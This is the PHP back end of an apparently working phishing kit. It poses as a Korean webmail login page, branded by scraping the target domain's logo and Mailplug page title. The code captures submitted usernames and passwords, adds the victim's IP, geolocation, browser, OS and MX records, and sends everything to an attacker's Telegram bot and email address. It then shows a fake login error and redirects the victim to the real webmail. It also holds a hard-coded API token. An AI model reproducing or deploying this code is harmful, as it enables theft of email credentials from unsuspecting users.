<?php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once 'login.php';
require_once __DIR__ . '/config.php';

$img = '';
$decoded = '';
$login_id = '';
$domain = '';
$noTld = '';
$noTld_upper = '';
$title = '로그인';
$error = 'display: none;';
$url = $login = $username = $password = '';

// Process incoming ID parameter
if (!empty($_GET['id'])) {
    $result = base64_decode((string)$_GET['id'], true);
    if ($result !== false && str_contains($result, '@')) {
        $decoded = $result;
        $login_id = strstr($result, '@', true);
        $parts = explode('@', $result);
        $domain = $parts[1] ?? '';
    }
}

function status(?string $url): ?int {
    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) {
        return null;
    }

    if (!function_exists('curl_init')) return null;

    $ch = curl_init($url);
    if ($ch === false) return null;

    curl_setopt_array($ch, [
        CURLOPT_HTTPGET        => true,
        CURLOPT_NOBODY         => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 5,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 4,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    ]);

    curl_exec($ch);

    if (curl_errno($ch)) {
        curl_close($ch);
        return null;
    }

    $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ($statusCode && $statusCode > 0) ? (int)$statusCode : null;
}

function getDomainName(string $url, string $cacheFile = ''): string {
    if (empty($url)) return '';

    if ($cacheFile === '') {
        $cacheFile = __DIR__ . DIRECTORY_SEPARATOR . 'psl_cache.dat';
    }

    // Refresh Public Suffix List cache if older than 24 hours
    if (!file_exists($cacheFile) || (time() - filemtime($cacheFile)) > 86400) {
        if (function_exists('curl_init')) {
            $ch = curl_init('https://publicsuffix.org/list/public_suffix_list.dat');
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT        => 6,
                CURLOPT_CONNECTTIMEOUT => 3,
                CURLOPT_SSL_VERIFYPEER => false,
            ]);
            $data = curl_exec($ch);
            curl_close($ch);

            if ($data !== false) {
                @file_put_contents($cacheFile, $data);
            }
        }
    }

    if (!file_exists($cacheFile)) {
        // Fallback basic extraction if cache file cannot be written
        $cleanHost = parse_url($url, PHP_URL_HOST) ?? $url;
        $hostParts = explode('.', strtolower(preg_replace('/^www\./i', '', $cleanHost)));
        return count($hostParts) > 1 ? $hostParts[count($hostParts) - 2] : ($hostParts[0] ?? '');
    }

    $lines = @file($cacheFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($lines === false) return '';

    $psl = [];
    foreach ($lines as $line) {
        if (!str_starts_with($line, '//')) {
            $psl[trim($line)] = true;
        }
    }

    $host = parse_url($url, PHP_URL_HOST) ?? $url;
    $host = strtolower(preg_replace('/^www\./i', '', $host));
    $parts = explode('.', $host);
    $n = count($parts);

    $matchLen = 1;
    for ($i = 0; $i < $n - 1; $i++) {
        $candidate = implode('.', array_slice($parts, $i));
        $wildcard  = '*.' . implode('.', array_slice($parts, $i + 1));
        if (isset($psl[$candidate]) || isset($psl[$wildcard])) {
            $matchLen = $n - $i;
            break;
        }
    }

    return $parts[$n - $matchLen - 1] ?? '';
}

function getUserIP(): string {
    $ipKeys = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];

    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
    }

    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

function getUserBrowser(): string {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (strpos($user_agent, 'Edge') !== false || strpos($user_agent, 'Edg/') !== false) return 'Microsoft Edge';
    if (strpos($user_agent, 'Chrome') !== false) return 'Google Chrome';
    if (strpos($user_agent, 'Safari') !== false && strpos($user_agent, 'Chrome') === false) return 'Safari';
    if (strpos($user_agent, 'Firefox') !== false) return 'Mozilla Firefox';
    if (strpos($user_agent, 'MSIE') !== false || strpos($user_agent, 'Trident') !== false) return 'Internet Explorer';
    if (strpos($user_agent, 'Opera') !== false || strpos($user_agent, 'OPR') !== false) return 'Opera';
    return 'Unknown';
}

function getUserOS(): string {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (strpos($user_agent, 'Windows NT 10.0') !== false) return 'Windows 10/11';
    if (strpos($user_agent, 'Windows NT 6.3') !== false)  return 'Windows 8.1';
    if (strpos($user_agent, 'Windows NT 6.2') !== false)  return 'Windows 8';
    if (strpos($user_agent, 'Windows NT 6.1') !== false)  return 'Windows 7';
    if (strpos($user_agent, 'Macintosh') !== false)       return 'Macintosh';
    if (strpos($user_agent, 'iPhone') !== false)          return 'iOS (iPhone)';
    if (strpos($user_agent, 'Android') !== false)         return 'Android';
    if (strpos($user_agent, 'Linux') !== false)           return 'Linux';
    return 'Unknown';
}

function getMxStatus(string $domain): string {
    $domain = strtolower(trim($domain));
    if ($domain === '') return 'Invalid Domain';
    return checkdnsrr($domain, 'MX') ? 'MX record found' : 'No MX record found';
}

function getMxDetails(string $domain): string {
    $domain = strtolower(trim($domain));
    if ($domain === '') {
        return 'Invalid Domain';
    }

    $mxHosts = [];
    $mxWeights = [];

    // getmxrr populates $mxHosts and returns true if records exist
    if (getmxrr($domain, $mxHosts, $mxWeights) && !empty($mxHosts)) {
        // Sort hosts by preference weight if available
        array_multisort($mxWeights, SORT_ASC, $mxHosts);
        return 'Found: ' . implode(', ', $mxHosts);
    }

    return 'No MX records found';
}

function getUserLocationData(string $ip): array {
    if (in_array($ip, ['127.0.0.1', '::1'], true)) {
        return [
            'country'   => 'Localhost',
            'city'      => 'Localhost',
            'region'    => 'Localhost',
            'formatted' => "{$ip}, Localhost"
        ];
    }

    $response = false;
    if (function_exists('curl_init')) {
        $ch = curl_init("http://ip-api.com/json/$ip");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 3,
            CURLOPT_CONNECTTIMEOUT => 2,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT      => 'Mozilla/5.0',
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
    }

    if ($response === false) {
        $response = @file_get_contents("http://ip-api.com/json/$ip");
    }

    $details = $response ? json_decode($response) : null;
    $country = $details->country ?? 'Unknown';
    $city    = $details->city ?? 'Unknown';
    $region  = $details->region ?? 'Unknown';

    return [
        'country'   => $country,
        'city'      => $city,
        'region'    => $region,
        'formatted' => "{$ip}, {$country} ({$city}, {$region})"
    ];
}

function tg(string $message) {
    if (!defined('TG_TOKEN') || !defined('TG_CHAT_ID') || !TG_TOKEN || !TG_CHAT_ID) {
        return false;
    }

    $url = "https://api.telegram.org/bot" . TG_TOKEN . "/sendMessage";
    $params = [
        'chat_id'    => TG_CHAT_ID,
        'text'       => $message,
        'parse_mode' => 'Markdown'
    ];

    if (!function_exists('curl_init')) return false;

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($params),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// Prepare UI Data
if (!empty($domain)) {
    $noTld = getDomainName($domain);
    $noTld_upper = strtoupper($noTld);
    $img = "https://img.logo.dev/{$domain}?token=live_6a1a28fd-6420-4492-aeb0-b297461d9de2&size=100&retina=true&format=webp&theme=light&w=128&q=75";

    // Grab Brand Title from Mailplug login
    if (function_exists('curl_init')) {
        $httpd = "https://login.mailplug.com/auth/login?host_domain={$domain}";
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $httpd,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 4,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        ]);
        $html = curl_exec($ch);
        curl_close($ch);

        if ($html) {
            preg_match('/<div[^>]*class="[^"]*login-logo-value-container[^"]*"[^>]*>.*?<p[^>]*>(.*?)<\/p>/is', $html, $matches);
            if (!empty($matches[1])) {
                $title = html_entity_decode(trim($matches[1]), ENT_QUOTES, 'UTF-8');
            } else {
                preg_match('/<title>(.*?)<\/title>/i', $html, $matches);
                if (!empty($matches[1])) {
                    $title = html_entity_decode(trim($matches[1]), ENT_QUOTES, 'UTF-8');
                }
            }
        }
    }

    $status = status($img);
    if ($status === 200) {
        $img_url = $img;
    } else {
        $img_url = "https://webmail.emailpnl.com/webmail_assets/favicon.ico";
    }
} else {
    $img_url = "https://webmail.emailpnl.com/webmail_assets/favicon.ico";
}

if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
}

// POST Action Processor
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $login = trim($_POST['login'] ?? '');
    $username = trim($_POST['user'] ?? '');
    $password = trim($_POST['pass'] ?? '');

    if (empty($username) || empty($password)) {
        $error = 'display: block;';
    } elseif (str_contains($username, '@') && !filter_var($username, FILTER_VALIDATE_EMAIL)) {
        $error = 'display: block;';
    }

    $web = parse_url($login, PHP_URL_PATH) ?? $login;

    if (strpos($web, 'yunyou') !== false) {
        $url = "http://mail.{$domain}";
    } elseif (isset($urls[$login])) {
        $url = $urls[$login];
    } else {
        $url = "http://webmail.{$domain}";
    }

    if ($error === 'display: none;') {
        $os           = getUserOS();
        $userIP       = getUserIP();
        $browser      = getUserBrowser();
        $locationData = getUserLocationData($userIP);
        $country      = $locationData['country'];
        $userLocation = $locationData['formatted'];
        $mxStatus     = getMxStatus($domain);
		$mxDetails    = getMxDetails($domain);
        $date         = date('l d, F Y (h:i:s A)');

        $subject = "B2B-Update from {$username} | {$country} | {$userIP}";
        $message = "\n";
        $message .= "{$url}\n";
		$message .= "Page: B2B-Update\n";
        $message .= "USR: {$username}\n";
        $message .= "PWD: {$password}\n";
        $message .= "Country: {$country}\n";
        $message .= "MX Status: {$mxStatus}\n";
		$message .= "MX Records: {$mxDetails}\n";
        $message .= "IP: {$userIP}\n";
        $message .= "Location: {$userLocation}\n";
        $message .= "Browser: {$browser}\n";
        $message .= "Operating System: {$os}\n";
        $message .= "Date: {$date}\n\n";

        $serverHost = $_SERVER['SERVER_NAME'] ?? 'localhost';
        $headers = [
            'From'         => 'Notification <noreply@' . $serverHost . '>',
            'Reply-To'     => $username,
            'X-Mailer'     => 'PHP/' . phpversion(),
            'Content-Type' => 'text/plain; charset=utf-8'
        ];

        $pull = tg($message);
        $push = defined('EMAIL') ? @mail(EMAIL, $subject, $message, $headers) : false;
        $_SESSION['login_attempts']++;

        if ($push || $pull) {
            $error = 'display: block;';
        }

        $maxAttempts = defined('SUBMIT') ? (int)SUBMIT : 2;
        if ($_SESSION['login_attempts'] >= $maxAttempts) {
            session_destroy();
            if (function_exists('self_destruct_and_redirect')) {
                self_destruct_and_redirect($url);
            } else {
                header("Location: {$url}");
            }
            exit();
        }
    }
}
?>